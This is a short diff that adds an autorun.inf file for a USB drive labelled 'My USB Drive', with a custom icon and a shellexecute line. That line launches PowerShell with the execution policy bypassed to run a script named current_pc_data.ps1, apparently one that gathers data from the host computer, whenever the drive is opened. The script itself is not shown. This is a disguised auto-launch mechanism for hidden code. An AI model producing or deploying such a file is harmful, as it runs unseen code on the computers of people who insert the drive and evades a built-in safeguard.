@@ -1,0 +1,4 @@
+[Autorun]
+label=My USB Drive
+icon=myicon.ico
+shellexecute=powershell.exe -ExecutionPolicy Bypass -File current_pc_data.ps1
